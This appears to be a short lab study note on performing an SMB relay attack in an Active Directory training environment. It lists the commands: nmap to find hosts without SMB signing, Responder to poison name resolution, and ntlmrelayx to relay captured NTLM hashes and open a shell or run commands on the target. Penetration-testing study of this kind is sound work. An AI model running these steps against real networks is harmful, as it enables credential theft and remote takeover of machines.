# Important Note for this attack to work:

- For this attack to work, **we must have the user have credentials on both the machines that too as admin** (local admin).
	- For example, we have `fcastle` on both `The Punisher` and on `Spiderman`.
	- `fcastle` cannot intercept a target and relay it back to itself.
	  
![[Pasted image 20250328153654.png]]

1. Identify **Hosts Without SMB Signing**:
	 - `nmap --script=smb2-security-mode.nse -p445 <IP>`
![[Pasted image 20250328144649.png]]

2. Make some **changes in responder config and run it:**
	- `sudo vi /etc/responder/Responder.conf`
	- These were needed on in ==LLMR poisoning as we needed to capture these but here, we need to relay them.==
	- `sudo responder -I tun0 -dwv`
   ![[Pasted image 20250328145019.png]]

3. Setup SMB Relay:
   - `sudo ntlmrealyx.py -tf targets.txt -smb2support`
   - `
   - impacket-ntlmrelayx -tf targets.txt -smb2support`
	   - `targets.txt` -> host with SMB signin disabled or not enforced
	   - When responder catches the hash, it forwards this to smb2relay and this forwards to machine.
	  
3. Open attacker IP on File Explorer (same as LLMNR poisoning)
   
4. Win:
   - Alternative wins: Add `-i` at the end of smbrelay command to ==**spawn a shell**==
   - Or execute commands with `-c "whoami"`
   ![[Pasted image 20250328145645.png]]
	![[Pasted image 20250328145822.png]]